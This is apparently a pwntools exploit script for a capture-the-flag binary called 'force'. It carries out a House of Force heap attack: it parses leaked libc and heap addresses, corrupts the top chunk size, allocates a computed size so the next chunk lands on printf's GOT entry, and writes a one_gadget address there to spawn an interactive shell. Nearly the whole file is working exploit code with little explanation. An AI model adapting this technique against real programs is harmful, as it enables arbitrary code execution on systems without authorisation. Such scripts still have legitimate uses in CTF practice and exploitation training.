from pwn import *

context.encoding = "utf-8"

# there is NO PIE, I can overwrite whatever got entries I want
# I use the house of force to overwrite a GOT entry and just one gadget it

libc = ELF("./.glibc/glibc_2.28_no-tcache/libc.so.6")
elf = ELF("./force")

p = process("./force")
#p = remote("0.cloud.chals.io", 11996)

pause()
p.recvuntil("system at ")
system_addr = int(p.recvline()[:-1],16)
libc_base = system_addr - 0x0000000000041b70

p.recvuntil("something else at ")
heap_addr = int(p.recvline()[:-1],16) 

print(hex(heap_addr), hex(system_addr))

p.recvuntil("Surrender\n")
p.sendline("1")
print(p.sendlineafter("?:","136"))
p.sendlineafter("?:", b'\xff'*(136+8))

target_addr = elf.got['printf']
heap_top = (0x1ba1090 - 0x1ba1000) + heap_addr
size = target_addr - heap_top - 0x20
print("target", hex(target_addr))
print("size",  size)

p.sendline("1")
print(p.sendlineafter("?:", str(size)))
print(p.sendlineafter("?:", "")) 

p.sendline("1")
print(p.sendlineafter("?:", "64"))
print(p.sendlineafter("?:", p64(libc_base + 0x419f6)*2))

p.interactive()
